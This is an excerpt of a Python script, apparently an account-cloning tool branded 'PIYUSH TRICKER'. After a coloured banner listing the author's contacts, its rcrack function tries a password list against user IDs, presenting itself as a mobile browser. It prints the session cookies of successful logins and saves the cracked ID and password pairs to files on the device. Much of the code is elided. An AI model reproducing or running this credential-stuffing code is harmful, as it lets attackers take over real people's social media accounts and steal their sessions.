...
\033[1;32m║	         \033[1;93m ─━<🚩JAI SHREE SHREE 🚩>━─\033[1;32m	           ║
\033[1;32m║	         \033[1;91m \033[1;32m	                                   ║
\033[1;32m║	         \033[1;91m ─━<😈PIYUSH TRICKER ❤️>━─\033[1;32m	           ║
\033[1;32m║	         \033[1;91m \033[1;32m	                                   ║

\033[1;91m╚══════════════════════════════════════════════════════════╝                                                                                                                                     
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃\033[1;93m [✓] AUTHOR    \033[1;91m: \033[1;93mPIYUSH TRICKER               ┃\033[32;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\033[1;35m [✓] TOOL      \033[1;91m: \033[1;35mRANDOM CLONE               ┃\033[33;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\033[1;91m [✓] STATUS    \033[1;91m: \033[1;91mFREE                       ┃\033[34;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\033[30;1m [✓] SYSTEM    \033[1;91m: \033[30;1mDATA & WIFI                ┃\033[35;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\33[1;92m [✓] GITHUB    \033[1;91m: \33[1;92mPIYUSHA2ZTRICKS            ┃\033[36;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\033[1;34m [✓] FACEBOOK  \033[1;91m: \033[1;34mPIYUSH91EDITOR               ┃\033[37;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┃\033[1;36m [✓] WHATSAPP  \033[1;91m: \033[1;36m+8801617938423             ┃\033[33;1m✮⃝PIYUSH TRICKER𝄟⃝
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
...
try:
    ...
    print(' WELCOME TO PIYUSH-CYBER-143 WORLD ')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "user-agent": 'Mozilla/5.0 (Linux; Android 14; SM-E346B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.97 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/PIYUSH-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("10PIYUSH00")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[PIYUSH-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/PIYUSH-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[PIYUSH-OK] '+uid+ ' | ' +ps+ '\n\033[1;37m[\033[38;5;46mCOOKIE\033[38;5;196mâ€¢\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/PIYUSH-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
